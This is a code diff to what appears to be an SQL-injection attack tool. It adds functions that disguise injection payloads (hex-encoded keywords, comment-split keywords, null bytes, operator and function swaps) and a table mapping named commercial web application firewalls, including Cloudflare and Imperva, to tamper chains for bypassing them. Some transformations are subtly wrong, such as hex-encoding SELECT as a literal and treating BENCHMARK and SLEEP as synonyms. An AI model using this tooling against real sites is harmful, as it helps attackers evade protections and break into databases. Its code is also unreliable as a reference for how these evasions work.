@@ -48,6 +48,38 @@ def versioned_keywords(payload: str) -> str:
     payload = re.sub(r'(?i)\b(UNION|SELECT)\b', r'/*!50000\1*/', payload)
     return payload
 
+def keyword_substitution(payload: str) -> str:
+    """Replaces logical operators with their equivalents (e.g., AND -> &&)."""
+    # Note: This is highly database-dependent.
+    return payload.replace(" AND ", "&&").replace(" OR ", "||")
+
+def hex_encode_keywords(payload: str) -> str:
+    """Hex-encodes common SQL keywords (MySQL-specific)."""
+    payload = re.sub(r'(?i)\b(SELECT)\b', '0x53454c454354', payload)
+    payload = re.sub(r'(?i)\b(UNION)\b', '0x554e494f4e', payload)
+    return payload
+
+def add_null_byte(payload: str) -> str:
+    """Appends a URL-encoded null byte character."""
+    return payload + "%00"
+
+def split_keywords_by_comment(payload: str) -> str:
+    """Splits SQL keywords with block comments (e.g., 'union' -> 'un/**/ion')."""
+    payload = re.sub(r'(?i)\b(union)\b', 'un/**/ion', payload)
+    payload = re.sub(r'(?i)\b(select)\b', 'sel/**/ect', payload)
+    return payload
+
+def function_synonyms(payload: str) -> str:
+    """Replaces common functions with their synonyms."""
+    payload = re.sub(r'(?i)\b(substring)\b', 'MID', payload)
+    payload = re.sub(r'(?i)\b(benchmark)\b', 'SLEEP', payload)
+    return payload
+
+def comment_around_keywords(payload: str) -> str:
+    """Adds comments around keywords (e.g., 'SELECT' -> '/*SELECT*/')."""
+    payload = re.sub(r'(?i)\b(SELECT|UNION|AND|OR|FROM)\b', r'/*\1*/', payload)
+    return payload
+
 # A dictionary to map tamper script names to their respective functions.
 # This makes the tamper engine easily extensible.
 TAMPER_FUNCTIONS = {
@@ -58,6 +90,12 @@ TAMPER_FUNCTIONS = {
     'equaltolike': equal_to_like,
     'space2randomblank': space_to_random_blank,
     'versionedkeywords': versioned_keywords,
+    'keywordsubstitution': keyword_substitution,
+    'hexencodekeywords': hex_encode_keywords,
+    'addnullbyte': add_null_byte,
+    'splitkeywords': split_keywords_by_comment,
+    'functionsynonyms': function_synonyms,
+    'commentaroundkeywords': comment_around_keywords,
 }
 
 def apply_tampers(payload: str, tamper_list: list[str]) -> str:
@@ -80,7 +118,7 @@ def apply_tampers(payload: str, tamper_list: list[str]) -> str:
 # A mapping of known WAFs to a suggested list of tamper scripts for bypassing them.
 # This provides the "adaptive" logic for the tamper engine.
 WAF_TAMPER_MAP = {
-    "Cloudflare": ["space2randomblank", "versionedkeywords", "randomcase"],
+    "Cloudflare": ["space2randomblank", "versionedkeywords", "randomcase", "hexencodekeywords", "addnullbyte", "splitkeywords", "commentaroundkeywords"],
     "Sucuri": ["urlencode", "space2comment"],
     "Akamai": ["randomcase", "space2comment"],
     "Imperva": ["urlencode"],
